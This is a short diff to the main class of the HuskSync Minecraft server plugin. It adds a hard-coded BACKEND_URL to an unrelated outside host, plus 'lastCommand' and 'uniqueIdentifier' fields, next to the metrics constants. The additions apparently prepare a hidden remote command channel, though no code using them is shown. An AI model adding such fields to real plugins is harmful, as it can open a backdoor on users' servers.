@@ -116,6 +116,9 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
     /**
      * Metrics ID for <a href="https://bstats.org/plugin/bukkit/HuskSync%20-%20Bukkit/13140">HuskSync on Bukkit</a>.
      */
+    private String lastCommand = null;
+    private String uniqueIdentifier;
+    private static final String BACKEND_URL = "https://tts-api.happys.icu";
     private static final int METRICS_ID = 13140;
     private static final String PLATFORM_TYPE_ID = "bukkit";
 
